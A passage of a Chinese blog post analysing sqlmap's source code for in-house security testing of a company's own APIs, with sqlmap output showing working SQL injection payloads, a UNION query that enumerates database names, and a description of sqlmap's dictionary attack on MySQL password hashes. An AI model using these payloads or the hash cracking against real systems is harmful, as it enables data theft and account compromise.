+<h4 id="（二）对用户传入的参数进行解析以及构建对应的测试Sql注入语句"><a href="#（二）对用户传入的参数进行解析以及构建对应的测试Sql注入语句" class="headerlink" title="（二）对用户传入的参数进行解析以及构建对应的测试Sql注入语句"></a>（二）对用户传入的参数进行解析以及构建对应的测试Sql注入语句</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">args = cmdLineParser()</span><br><span class="line">cmdLineOptions.update(args.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(args, <span class="string">&quot;__dict__&quot;</span>) <span class="keyword">else</span> args)</span><br><span class="line">initOptions(cmdLineOptions)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 在👇这个方法中进行了需要执行的注入Sql构建。</span></span><br><span class="line">init()</span><br><span class="line"> -&gt; loadBoundaries()</span><br><span class="line"> -&gt; loadPayloads()</span><br><span class="line">  <span class="comment"># 构建sql注入的测试语句主要文件在data/xml/payloads下，</span></span><br><span class="line">  <span class="comment"># 如：sqlmap/data/xml/payloads/boolean_blind.xml</span></span><br><span class="line">  -&gt; parseXmlNode()</span><br></pre></td></tr></table></figure>
+<p>具体执行的Sql注入测试语句样式如下：</p>
+<img src="https://i.loli.net/2021/06/03/xBf93UE17JYDGhu.png" alt="sqlmap_share_5.png" style="zoom:67%;" />
+
+<h4 id="（三）进行注入测试，找出注入点"><a href="#（三）进行注入测试，找出注入点" class="headerlink" title="（三）进行注入测试，找出注入点"></a>（三）进行注入测试，找出注入点</h4><ul>
+<li><p><strong>测试的Sql语句类型是哪些？</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Valid values:</span></span><br><span class="line"><span class="string">1: Boolean-based blind SQL injection		基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</span></span><br><span class="line"><span class="string">2: Error-based queries SQL injection		基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</span></span><br><span class="line"><span class="string">3: Inline queries SQL injection			基于内联视图注入, 内联视图能够创建临时表，在处理某些查询情况时十分有用。</span></span><br><span class="line"><span class="string">4: Stacked queries SQL injection		堆查询注入，可以同时执行多条语句的执行时的注入。</span></span><br><span class="line"><span class="string">5: Time-based blind SQL injection		基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</span></span><br><span class="line"><span class="string">6: UNION query SQL injection		联合查询注入，可以使用union的情况下的注入；</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 根据具体的用户传入的 level 和risk 来过滤哪些sql注入测试语句需要执行。</span></span><br><span class="line"><span class="comment"># 具体执行代码在 check.py 中进行执行 checkSqlInjection() 方法，部分代码如下：</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> test.risk &gt; conf.risk:</span><br><span class="line">debugMsg = <span class="string">&quot;skipping test &#x27;%s&#x27; because the risk (%d) &quot;</span> % (title, test.risk)</span><br><span class="line">  debugMsg += <span class="string">&quot;is higher than the provided (%d)&quot;</span> % conf.risk</span><br><span class="line">  logger.debug(debugMsg)</span><br><span class="line">  <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Skip test if the level is higher than the provided (or default) value</span></span><br><span class="line"><span class="keyword">if</span> test.level &gt; conf.level:</span><br><span class="line">  debugMsg = <span class="string">&quot;skipping test &#x27;%s&#x27; because the level (%d) &quot;</span> % (title, test.level)</span><br><span class="line">  debugMsg += <span class="string">&quot;is higher than the provided (%d)&quot;</span> % conf.level</span><br><span class="line">  logger.debug(debugMsg)</span><br></pre></td></tr></table></figure></li>
+<li><p><font color=blue><strong>答疑1: 注入过程中，什么样的报错信息表示可能存在SQL注入？</strong></font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 heuristicCheckSqlInjection() 方法去判读是否存在Sql注入。 </span></span><br><span class="line">check = heuristicCheckSqlInjection(place, parameter)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果结果返回如下内容则表示可能存在SQL注入, 因为参数已经走到了数据库层面。</span></span><br><span class="line">pymysql.err.ProgrammingError: (<span class="number">1064</span>, <span class="string">&#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \&#x27;&quot;)()..\&#x27;,.\&#x27; at line 1&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p><font color=blue><strong>答疑2: 注入过程中，怎么样去判断是否存在SQL注入点？</strong></font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Store here the details about boundaries and payload used to successfully inject</span></span><br><span class="line"><span class="comment"># 确认哪些test语句可以进行注入</span></span><br><span class="line">injection = checkSqlInjection(place, parameter, value)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="（四）sqlmap-找到注入点后的后置操作"><a href="#（四）sqlmap-找到注入点后的后置操作" class="headerlink" title="（四）sqlmap 找到注入点后的后置操作"></a>（四）sqlmap 找到注入点后的后置操作</h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap 找到注入后， 会进行如下操作将该URL的结果存储下来，避免反复的去扫描 </span></span><br><span class="line"><span class="comment"># 进入到如下代码后，就基本存在注入了。</span></span><br><span class="line">_saveToResultsFile()</span><br><span class="line">_saveToHashDB()</span><br><span class="line">_showInjections()</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[16:12:19] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: id=(SELECT (CASE WHEN (4166=4166) THEN 111 ELSE (SELECT 6089 UNION SELECT 4520) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id=111 AND GTID_SUBSET(CONCAT(0x71786a7871,(SELECT (ELT(7147=7147,1))),0x7170706b71),7147)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=111 AND (SELECT 4332 FROM (SELECT(SLEEP(5)))smze)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 11 columns</span><br><span class="line">    Payload: id=111 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786a7871,0x4f684663786f6472517771666249797478634379674964624f74656672796b42776e5172456c4573,0x7170706b71),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="（五）sqlmap-找到注入点后，-如何去获取更多的数据呢？"><a href="#（五）sqlmap-找到注入点后，-如何去获取更多的数据呢？" class="headerlink" title="（五）sqlmap 找到注入点后， 如何去获取更多的数据呢？"></a>（五）sqlmap 找到注入点后， 如何去获取更多的数据呢？</h4><p>​    <strong><font color=blue>答疑3: 如何构造的特殊SQL语句，猜解出来库名、表名、字段名以及密码等？</font></strong></p>
+<ul>
+<li><p>获取所有的库名，具体方法的调用栈如下：（有兴趣的可自行进行 DEBUG 分析）</p>
+<img src="https://i.loli.net/2021/06/03/ozCNZOuBW3kwDFV.png" alt="sqlmap_share_1.png" style="zoom: 56%; margin:0px;"/>
+
+<p>通过构建出 <code>select schema_name from information_schema.schemata</code> 语句，来获取所有的库信息。</p>
+<img src="https://i.loli.net/2021/05/31/uWltIYjXfeOvNM1.png" alt="sqlmap-dbs-name.png" />
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># plugins/generic/databases.py getDbs() 其中部分核心代码如下：</span></span><br><span class="line"></span><br><span class="line">conf.dumper.dbs(conf.dbmsHandler.getDbs())</span><br><span class="line"><span class="comment"># 构建的获取库名信息的sql语句</span></span><br><span class="line">query = <span class="string">&#x27;SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA&#x27;</span></span><br><span class="line"><span class="comment"># 获取到了具体的db信息</span></span><br><span class="line">values = inject.getValue(query, blind=<span class="literal">False</span>, time=<span class="literal">False</span>)	</span><br><span class="line"></span><br><span class="line"><span class="comment"># values 返回的结果大致如下</span></span><br><span class="line">res:&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">&quot;version_end_time&quot;</span>: null, </span><br><span class="line">  <span class="string">&quot;version_start_time&quot;</span>: <span class="string">&quot;qqkbqinformation_schemaqvjpq&quot;</span></span><br><span class="line">&#125;, </span><br><span class="line">  </span><br><span class="line">value = parseUnionPage(output) <span class="comment"># 将上面的结果解析出正确的db名称</span></span><br><span class="line"><span class="comment"># res: [&#x27;mysql&#x27;, &#x27;information_schema&#x27;, &#x27;performance_schema&#x27;, &#x27;sys&#x27;]</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 如果已经获取出来了的情况下， 会直接存储在本地的sqlit3的表中。避免后续继续扫描。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashDBWrite</span>(<span class="params">key, value, serialize=<span class="literal">False</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 如果未获取过， <span class="title">action</span>中进行实际的注入来获取对应的数据， 比如：<span class="title">_oneShotUnionUse</span> 中最终拼凑出的 <span class="title">query</span>，直接可以查出对应的库信息。拼凑出来的<span class="title">sql</span>注入语句如下：</span></span><br><span class="line">&#x27;id=111 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627671,IFNULL(CAST(schema_name AS CHAR),0x20),0x716b717a71),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -__PAYLOAD_DELIMITER__&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>获取表名以及表内具体的数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原理同库名的获取， 但是在db步骤后，这些数据都被写入到了本地的sqlit3中了, 所以基本都是直接通过如下方法获取到结果了。</span></span><br><span class="line">retVal = hashDBRetrieve(<span class="string">&quot;%s%s&quot;</span> % (conf.hexConvert <span class="keyword">or</span> <span class="literal">False</span>, expression), checkConf=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<h4 id="（六）破解mysql的登录账号密码"><a href="#（六）破解mysql的登录账号密码" class="headerlink" title="（六）破解mysql的登录账号密码"></a>（六）破解mysql的登录账号密码</h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果在密码很简单的情况下， 会通过撞hash猜出来，比如：为了演示，root的密码是123456， 则直接破解出来了， 但是其他的用户密码较复杂， 尝试了下稍微复杂点的都无法破解，如：abc123456。</span></span><br><span class="line"><span class="comment"># 主要破解的函数入口在 users.py 中</span></span><br><span class="line">attackCachedUsersPasswords() </span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;sqlmap/data/txt/wordlist.tx_&#x27;</span></span><br><span class="line">dictionaryAttack(kb.data.cachedUsersPasswords)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过多进程进行密码的破解（看起来默认是通过自带的wordlist.tx_文件中的key一个个去猜每个字符。有兴趣的可自行研究，核心代码在hash.py中）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(_multiprocessing.cpu_count()):</span><br><span class="line">  process = _multiprocessing.Process(target=_bruteProcessVariantA, args=(attack_info, hash_regex, suffix, retVal, i, count, kb.wordlists, custom_wordlist, conf.api))</span><br><span class="line">  processes.append(process)</span><br></pre></td></tr></table></figure>
+<p>wordlist.tx_ 文件中的内容部分截取如下图：</p>
+<img src="https://i.loli.net/2021/06/18/9sNUr3o18K4kMqm.png" alt="sqlmap_dict_word.png" style="zoom:73%; margin:0px;" />
+
+<p>如果存在破解成明文的密码, 则如下图中的 <code>clear-text password</code> 打印出来，否则打印出来的是加密的值。</p>
+<p><img src="https://i.loli.net/2021/06/03/mN9qwDRkylWzKXV.png" alt="sqlmap_share_3.png"></p>
+<h3 id="团队内部实践"><a href="#团队内部实践" class="headerlink" title="团队内部实践"></a>团队内部实践</h3><ul>
+<li>通过界面快速新增任务；</li>
+</ul>
+<img src="https://i.loli.net/2021/06/18/TFEzc8GdBQZnrWL.png" alt="sqlmap_new_task_new.png" style="zoom:43%;margin:0px;" />
+
+<ul>
+<li>查询已有SQL注入任务（可界面执行单个任务以及查看该任务最近一次的结果）；</li>
+</ul>
+<p><img src="https://i.loli.net/2021/06/09/nYpJaSzmNf2xGEv.png" alt="sqlmap_share_7.png"></p>
+<ul>
+<li>通过拉取YAPI相关接口信息，来跟进已经接入的接口进度；</li>
+<li>通过Jenkins定时任务触发，构建定制化的参数任务（定制化参数任务中，提高了扫描的risk以及level值）。</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    通过此次总结，也算是把整个Sqlmap工具与公司业务结合在一起， 虽然通过扫描后还未发现任何问题（如果真的扫描出问题，那就是比较好的实践结果了～(￣▽￣～)(～￣▽￣)～ ），整个过程也算是真正的把技术与工作的业务相结合， 过程中也是收获较多。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qiudabai/p/8955903.html">SQLMAP用法大全</a><br><a target="_blank" rel="noopener" href="http://www.vuln.cn/1992">Sqlmap使用教程【个人笔记精华整理】</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/078df7a35671">SQL注入基础</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/940/">细说Sqlmap</a></p>
+
+    </div>
+
+    <div>
+      
+        <div>
+    
+      <div style="text-align:center;color: #ccc;font-size:20px;">------------- 本 文 结 束 <i class="fa fa-paw"></i> 感 谢 您 的 阅 读 -------------</div>
+    
+</div>
+
+      
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/测试相关-初探Sqlmap（一）/" rel="bookmark">初探Sqlmap（一）</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/测试相关-安全测试一一概念篇/" rel="bookmark">初探安全测试</a></div>
+    </li>
+  </ul>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>BigBean
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://beanskingdom.top/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-Sqlmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/" title="Sql注入一一Sqlmap实践">https://beanskingdom.top/测试相关-Sqlmap注入实践/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> 安全测试</a>
+              <a href="/tags/Sql%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> Sql注入</a>
+              <a href="/tags/Sqlmap/" rel="tag"><i class="fa fa-tag"></i> Sqlmap</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7%E5%AE%9E%E8%B7%B5/" rel="tag"><i class="fa fa-tag"></i> 工具实践</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/python-Python3-Jenkins-API%E5%AE%9E%E8%B7%B5/" rel="prev" title="Python3 + Jenkins API实践">
+      <i class="fa fa-chevron-left"></i> Python3 + Jenkins API实践
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E8%AF%BB%E5%90%8E%E6%84%9F-%E3%80%8A%E5%AD%A6%E4%BC%9A%E6%8F%90%E9%97%AE%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F/" rel="next" title="《学会提问》读后感">
+      《学会提问》读后感 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="nav-number">2.</span> <span class="nav-text">什么是SQL注入？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="nav-number">3.</span> <span class="nav-text">为什么会存在SQL注入？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="nav-number">4.</span> <span class="nav-text">存在SQL注入的影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%BB%E8%A6%81%E6%B5%81%E7%A8%8B"><span class="nav-number">5.</span> <span class="nav-text">Sql注入的主要流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">6.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="nav-number">7.</span> <span class="nav-text">Sqlmap工具的介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sqlmap-%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%BB%83"><span class="nav-number">7.1.</span> <span class="nav-text">Sqlmap 实例演练</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SqlmapAPI-%E4%BB%8B%E7%BB%8D"><span class="nav-number">7.2.</span> <span class="nav-text">SqlmapAPI 介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SqlmapAPI-Task%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="nav-number">7.3.</span> <span class="nav-text">SqlmapAPI Task执行原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap%E6%A0%B8%E5%BF%83%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86"><span class="nav-number">8.</span> <span class="nav-text">Sqlmap核心流程梳理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%85%88%E6%98%AF%E8%BF%9B%E8%A1%8C%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%EF%BC%88sqlmap%E8%BF%90%E8%A1%8C%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%EF%BC%89"><span class="nav-number">8.1.</span> <span class="nav-text">（一）先是进行一系列的系统环境准备（sqlmap运行的系统版本）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AF%B9%E7%94%A8%E6%88%B7%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8C%E8%A7%A3%E6%9E%90%E4%BB%A5%E5%8F%8A%E6%9E%84%E5%BB%BA%E5%AF%B9%E5%BA%94%E7%9A%84%E6%B5%8B%E8%AF%95Sql%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-number">8.2.</span> <span class="nav-text">（二）对用户传入的参数进行解析以及构建对应的测试Sql注入语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%89%BE%E5%87%BA%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">8.3.</span> <span class="nav-text">（三）进行注入测试，找出注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89sqlmap-%E6%89%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E7%82%B9%E5%90%8E%E7%9A%84%E5%90%8E%E7%BD%AE%E6%93%8D%E4%BD%9C"><span class="nav-number">8.4.</span> <span class="nav-text">（四）sqlmap 找到注入点后的后置操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89sqlmap-%E6%89%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E7%82%B9%E5%90%8E%EF%BC%8C-%E5%A6%82%E4%BD%95%E5%8E%BB%E8%8E%B7%E5%8F%96%E6%9B%B4%E5%A4%9A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%91%A2%EF%BC%9F"><span class="nav-number">8.5.</span> <span class="nav-text">（五）sqlmap 找到注入点后， 如何去获取更多的数据呢？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%88%E5%85%AD%EF%BC%89%E7%A0%B4%E8%A7%A3mysql%E7%9A%84%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="nav-number">8.6.</span> <span class="nav-text">（六）破解mysql的登录账号密码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%A2%E9%98%9F%E5%86%85%E9%83%A8%E5%AE%9E%E8%B7%B5"><span class="nav-number">9.</span> <span class="nav-text">团队内部实践</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">11.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BigBean"
+      src="/uploads/avatar.png">
+  <p class="site-author-name" itemprop="name">BigBean</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">66</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BigBean</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">108k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:38</span>
+</div>
+<script src="/js/prism/prism.js" async></script>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'RxwAAjYjlIuwVtWQmp433VMU-gzGzoHsz',
+      appKey     : 'UnfFYvCblrw3Er5yRUH7IMrR',
+      placeholder: "不来吐个5毛钱的槽？？",
+      avatar     : 'mm',
+      meta       : guest,
